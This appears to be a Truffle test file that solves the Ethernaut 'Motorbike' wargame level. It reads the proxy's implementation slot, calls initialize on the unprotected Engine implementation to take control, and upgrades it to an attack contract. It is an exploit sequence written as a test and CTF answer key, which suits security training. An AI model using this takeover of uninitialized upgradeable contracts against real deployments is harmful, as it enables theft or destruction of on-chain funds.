const MotorbikeFactory = artifacts.require('MotorbikeFactory')
const Motorbike = artifacts.require('Motorbike')
const Engine = artifacts.require('Engine')
const MotorbikeAttack = artifacts.require('MotorbikeAttack')

const utils = require('../utils/TestUtils')

contract('Motorbike', function ([player]) {
  let ethernaut
  let level

  before(async function () {
    ethernaut = await utils.getEthernautWithStatsProxy()
    level = await MotorbikeFactory.new()
    await ethernaut.registerLevel(level.address)
  })

  it('should submit level instance successfully', async function () {
    const instance = await utils.createLevelInstance(ethernaut, level.address, player, Motorbike)

    const implementationSlot = await web3.eth.getStorageAt(
      instance.address,
      // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
      '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc',
    )
    const implementationAddress = '0x' + implementationSlot.substring(26, 66)
    const engine = await Engine.at(implementationAddress)
    await engine.initialize({ from: player })
    const attacker = await MotorbikeAttack.new({
      from: player,
    })
    await engine.upgradeToAndCall(attacker.address, '0xFF', { from: player, value: 1 })

    const completed = await utils.submitLevelInstance(
      ethernaut,
      level.address,
      instance.address,
      player,
    )
    assert.isTrue(completed)
  })
})
